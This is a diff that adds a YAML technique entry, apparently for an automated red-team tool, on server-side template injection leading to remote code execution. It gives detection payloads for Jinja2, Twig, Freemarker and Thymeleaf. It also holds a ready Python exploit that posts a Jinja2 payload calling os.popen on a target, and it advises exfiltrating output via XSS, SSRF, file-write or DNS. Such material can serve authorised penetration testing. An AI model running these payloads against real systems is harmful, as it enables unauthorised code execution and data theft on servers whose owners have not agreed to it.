@@ -1,0 +1,55 @@
+metadata:
+  id: cwe-94-ssti
+  name: SSTI/Template Injection
+  cwe_ids:
+  - CWE-94
+  - CWE-917
+  target_type: generic
+  tags:
+  - ssti
+  - jinja2
+  - twig
+  - freemarker
+  - rce
+  - template-injection
+  author: co-redteam
+  severity: critical
+content: 'Common trigger points: email rendering, page templates, PDF generation,
+  log messages.
+
+  Frameworks: Jinja2 (Flask/Django), Twig (PHP), ERB (Ruby), Freemarker (Java), Thymeleaf
+  (Spring)
+
+
+  Detection payloads:
+
+  {{7*7}}   -> expect 49 (Jinja2/Twig)
+
+  ${7*7}    -> expect 49 (Freemarker)
+
+  #{7*7}    -> expect 49 (Thymeleaf)
+
+
+  Jinja2 SSTI->RCE (adjust field names per target evidence):
+
+  import requests,urllib3,json; urllib3.disable_warnings(); base=''{TARGET_BASE_URL}''
+
+  payload="{{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}"
+
+  r=requests.post(f''{base}{INJECTION_ENDPOINT}'', data={''FIELD_NAME'':payload+''@x.com'',''OTHER'':''values''},
+  verify={VERIFY_FLAG})
+
+  print(''###CHAIN_OUTPUT###''+json.dumps({''status'':r.status_code,''body'':r.text[:300]}))
+
+
+  Key notes:
+
+  - SSTI output usually NOT returned in HTTP response! Need exfiltration via XSS/SSRF/file-write/DNS
+
+  - Use attack_chain from confirmed_vuln.json to identify exact injection point and
+  trigger path
+
+  - If email-related: payload injected at registration/profile update, triggered when
+  email is rendered/sent
+
+  '
